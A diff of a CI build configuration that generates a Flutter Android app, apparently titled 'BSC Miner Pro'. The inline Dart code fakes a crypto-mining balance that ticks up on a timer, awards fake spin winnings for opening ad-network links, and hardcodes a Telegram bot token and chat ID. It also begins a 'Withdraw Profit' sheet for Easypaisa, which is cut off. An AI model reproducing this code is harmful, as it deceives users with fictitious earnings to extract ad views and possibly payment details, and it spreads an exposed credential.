@@ -6,16 +6,25 @@ workflows:
     environment:
       flutter: stable
     scripts:
-      - name: VIBE PRO BUILD V3
+      - name: VIBE PRO BUILD V4 FIXED
         script: |
           set -e
           flutter create --platforms=android --org com.bscminer.app . --overwrite
           pip3 install pillow -q
           mkdir -p assets
-          python3 -c "from PIL import Image, ImageDraw; img=Image.new('RGB',(1024,1024),'#0B0E11'); d=ImageDraw.Draw(img); d.ellipse([60,60,964,964],fill:'#F3BA2F'); d.ellipse([140,140,884,884],fill:'#0B0E11'); d.ellipse([320,320,704,704],fill:'#F3BA2F'); img.save('assets/icon.png')"
+          python3 << 'PY'
+          from PIL import Image, ImageDraw
+          img=Image.new('RGB',(1024,1024),'#0B0E11')
+          d=ImageDraw.Draw(img)
+          d.ellipse([60,60,964,964],fill='#F3BA2F')
+          d.ellipse([140,140,884,884],fill='#0B0E11')
+          d.ellipse([340,340,684,684],fill='#F3BA2F')
+          img.save('assets/icon.png')
+          print("ICON OK")
+          PY
           cat > pubspec.yaml << 'YAML'
           name: bsc_miner_pro
-          version: 3.0.0+11
+          version: 3.0.1+12
           publish_to: none
           environment:
             sdk: ">=3.0.0 <4.0.0"
@@ -36,9 +45,8 @@ workflows:
           void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark().copyWith(scaffoldBackgroundColor:Color(0xFF0B0E11)),home:Pro()));
           class Pro extends StatefulWidget{@override State<Pro> createState()=>_ProState();}
           class _ProState extends State<Pro> with TickerProviderStateMixin{
-          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController pulse;
-          final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';
-          @override void initState(){super.initState();pulse=AnimationController(vsync:this,duration:Duration(milliseconds:900))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:90),(t){if(mining) setState(()=>bal+=0.00000021);});}
-          Future<void> boost()=>launchAd(0.00018);
-          Future<void> launchAd(double r)async{final u=Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');await launchUrl(u,mode:LaunchMode.externalApplication);setState(()=>{bal+=r,spins++,mining=true});}
-          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad For Spin!')));return;}double w=[0.0003,0.0007,0.0012,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>Dialog(backgroundColor:Color(0xFF1E2329),shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(20)),child:Padding(padding:EdgeInsets.all(24
+          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController pulse;final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';
+          @override void initState(){super.initState();pulse=AnimationController(vsync:this,duration:Duration(milliseconds:900))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:90),(t){if(mining&&mounted)setState(()=>bal+=0.00000021);});}
+          Future<void> launchAd(double r)async{final u=Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');await launchUrl(u,mode:LaunchMode.externalApplication);if(mounted)setState(()=>{bal+=r,spins++,mining=true});}
+          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad For Spin!')));return;}double w=[0.0003,0.0007,0.0012,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>Dialog(backgroundColor:Color(0xFF1E2329),shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(20)),child:Padding(padding:EdgeInsets.all(24),child:Column(mainAxisSize:MainAxisSize.min,children:[Icon(Icons.stars_rounded,color:Color(0xFFFCD535),size:60),SizedBox(height:10),Text('YOU WON!',style:TextStyle(fontWeight:FontWeight.w900)),Text('\$${w.toStringAsFixed(5)}',style:TextStyle(fontSize:32,fontWeight:FontWeight.w900,color:Color(0xFFFCD535))),SizedBox(height:15),SizedBox(width:double.infinity,child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFFCD535),foregroundColor:Colors.black),onPressed:(){Navigator.pop(context);launchAd(0);},child:Text('CLAIM X2 ADS'))),TextButton(onPressed:()=>Navigator.pop(context),child:Text('Collect',style:TextStyle(color:Colors.white54))) ]))));}
+          void withdrawSheet(){TextEditingController c=TextEditingController();String m='Easypaisa';showModalBottomSheet(context:context,isScrollControlled:true,backgroundColor:Color(0xFF181A20),shape:RoundedRectangleBorder(borderRadius:BorderRadius.vertical(top:Radius.circular(28))),builder:(ctx)=>StatefulBuilder(builder:(ctx,s)=>Padding(padding:EdgeInsets.fromLTRB(20,20,20,MediaQuery.of(ctx).viewInsets.bottom+24),child:Column(mainAxisSize:MainAxisSize.min,children:[Text('Withdraw Profit',style:TextStyle(fontSize:22,fontWeight:FontWeight.w900)),SizedBox(height:12),DropdownButtonFormField(value:m,dropdownColor
